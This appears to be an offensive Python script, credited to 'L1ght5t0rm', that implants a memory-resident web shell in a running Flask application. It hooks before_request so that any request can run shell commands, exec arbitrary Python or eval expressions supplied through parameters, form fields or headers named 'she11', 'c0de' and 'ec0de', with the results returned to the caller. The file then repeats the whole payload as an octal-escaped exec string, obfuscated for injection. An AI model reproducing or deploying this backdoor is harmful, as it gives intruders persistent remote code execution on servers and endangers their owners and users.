#!/usr/bin/env python3
# Copyright (c) 2025 L1ght5t0rm
# Inspired by https://1y0ng.github.io/post/2024/PythonFlask内存马的另辟途径


from flask import current_app
app=current_app
from flask import request
import os                                                                                       #
def backdoor():                                                                                ###
    global app,request,os                                                                      ###
    she11=os.popen(she11).read() if (she11:=request.args.get('she11'))or(she11:=request.form.get('she11'))or(she11:=request.headers.get('she11')) else None
    None if (c0de:=                         request.args.get('c0de'))or(c0de:=request.form.get('c0de'))or(c0de:=request.headers.get('c0de')) else None
    ec0de=ec0de if (ec0de:=request.args.get('ec0de'))or(ec0de:=request.form.get('ec0de'))or(ec0de:=request.headers.get('ec0de')) else None
    if c0de:                                                                                                               #############
        try:                                                                                                            #############
            exec(c0de)                                                                                                #############
            return None                                                                                            #############
        except Exception as e:                                                                                  #############
            return str(e),200,{'Content-Type': 'text/plain'}                                                #############
    if she11:                                                                                            #############
        return she11,200,{'Content-Type': 'text/plain'}                                              #############
    if ec0de:                                                                                     #############
        try:                                                                                   #############
            return str(eval(ec0de)),200,{'Content-Type': 'text/plain'}                      #############
        except Exception as e:                                                           #############
            return str(e),200,{'Content-Type': 'text/plain'}                         #############
_aPpFuNcS=app.before_request_funcs                                              #############
_aPpFuNcS[None]=[i for i in _aPpFuNcS.get(None, []) if 'backdoor' not in i.__name__]
_aPpFuNcS.setdefault(None, []).append(backdoor)


payload=exec('\12\12\146\162\157\155\40\146\154\141\163\153\40\151\155\160\157\162\164\40\143\165\162\162\145\156\164\137\141\160\160\12\141\160\160\75\143\165\162\162\145\156\164\137\141\160\160\12\146\162\157\155\40\146\154\141\163\153\40\151\155\160\157\162\164\40\162\145\161\165\145\163\164\12\151\155\160\157\162\164\40\157\163\12\144\145\146\40\142\141\143\153\144\157\157\162\50\51\72\12\40\40\40\40\147\154\157\142\141\154\40\141\160\160\54\162\145\161\165\145\163\164\54\157\163\12\40\40\40\40\163\150\145\61\61\75\157\163\56\160\157\160\145\156\50\163\150\145\61\61\51\56\162\145\141\144\50\51\40\151\146\40\50\163\150\145\61\61\72\75\162\145\161\165\145\163\164\56\141\162\147\163\56\147\145\164\50\47\163\150\145\61\61\47\51\51\157\162\50\163\150\145\61\61\72\75\162\145\161\165\145\163\164\56\146\157\162\155\56\147\145\164\50\47\163\150\145\61\61\47\51\51\157\162\50\163\150\145\61\61\72\75\162\145\161\165\145\163\164\56\150\145\141\144\145\162\163\56\147\145\164\50\47\163\150\145\61\61\47\51\51\40\145\154\163\145\40\116\157\156\145\12\40\40\40\40\116\157\156\145\40\151\146\40\50\143\60\144\145\72\75\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\40\162\145\161\165\145\163\164\56\141\162\147\163\56\147\145\164\50\47\143\60\144\145\47\51\51\157\162\50\143\60\144\145\72\75\162\145\161\165\145\163\164\56\146\157\162\155\56\147\145\164\50\47\143\60\144\145\47\51\51\157\162\50\143\60\144\145\72\75\162\145\161\165\145\163\164\56\150\145\141\144\145\162\163\56\147\145\164\50\47\143\60\144\145\47\51\51\40\145\154\163\145\40\116\157\156\145\12\40\40\40\40\145\143\60\144\145\75\145\143\60\144\145\40\151\146\40\50\145\143\60\144\145\72\75\162\145\161\165\145\163\164\56\141\162\147\163\56\147\145\164\50\47\145\143\60\144\145\47\51\51\157\162\50\145\143\60\144\145\72\75\162\145\161\165\145\163\164\56\146\157\162\155\56\147\145\164\50\47\145\143\60\144\145\47\51\51\157\162\50\145\143\60\144\145\72\75\162\145\161\165\145\163\164\56\150\145\141\144\145\162\163\56\147\145\164\50\47\145\143\60\144\145\47\51\51\40\145\154\163\145\40\116\157\156\145\12\40\40\40\40\151\146\40\143\60\144\145\72\12\40\40\40\40\40\40\40\40\164\162\171\72\12\40\40\40\40\40\40\40\40\40\40\40\40\145\170\145\143\50\143\60\144\145\51\12\40\40\40\40\40\40\40\40\40\40\40\40\162\145\164\165\162\156\40\116\157\156\145\12\40\40\40\40\40\40\40\40\145\170\143\145\160\164\40\105\170\143\145\160\164\151\157\156\40\141\163\40\145\72\12\40\40\40\40\40\40\40\40\40\40\40\40\162\145\164\165\162\156\40\163\164\162\50\145\51\54\62\60\60\54\173\47\103\157\156\164\145\156\164\55\124\171\160\145\47\72\40\47\164\145\170\164\57\160\154\141\151\156\47\175\12\40\40\40\40\151\146\40\163\150\145\61\61\72\12\40\40\40\40\40\40\40\40\162\145\164\165\162\156\40\163\150\145\61\61\54\62\60\60\54\173\47\103\157\156\164\145\156\164\55\124\171\160\145\47\72\40\47\164\145\170\164\57\160\154\141\151\156\47\175\12\40\40\40\40\151\146\40\145\143\60\144\145\72\12\40\40\40\40\40\40\40\40\164\162\171\72\12\40\40\40\40\40\40\40\40\40\40\40\40\162\145\164\165\162\156\40\163\164\162\50\145\166\141\154\50\145\143\60\144\145\51\51\54\62\60\60\54\173\47\103\157\156\164\145\156\164\55\124\171\160\145\47\72\40\47\164\145\170\164\57\160\154\141\151\156\47\175\12\40\40\40\40\40\40\40\40\145\170\143\145\160\164\40\105\170\143\145\160\164\151\157\156\40\141\163\40\145\72\12\40\40\40\40\40\40\40\40\40\40\40\40\162\145\164\165\162\156\40\163\164\162\50\145\51\54\62\60\60\54\173\47\103\157\156\164\145\156\164\55\124\171\160\145\47\72\40\47\164\145\170\164\57\160\154\141\151\156\47\175\12\137\141\120\160\106\165\116\143\123\75\141\160\160\56\142\145\146\157\162\145\137\162\145\161\165\145\163\164\137\146\165\156\143\163\12\137\141\120\160\106\165\116\143\123\133\116\157\156\145\135\75\133\151\40\146\157\162\40\151\40\151\156\40\137\141\120\160\106\165\116\143\123\56\147\145\164\50\116\157\156\145\54\40\133\135\51\40\151\146\40\47\142\141\143\153\144\157\157\162\47\40\156\157\164\40\151\156\40\151\56\137\137\156\141\155\145\137\137\135\12\137\141\120\160\106\165\116\143\123\56\163\145\164\144\145\146\141\165\154\164\50\116\157\156\145\54\40\133\135\51\56\141\160\160\145\156\144\50\142\141\143\153\144\157\157\162\51\12\12')


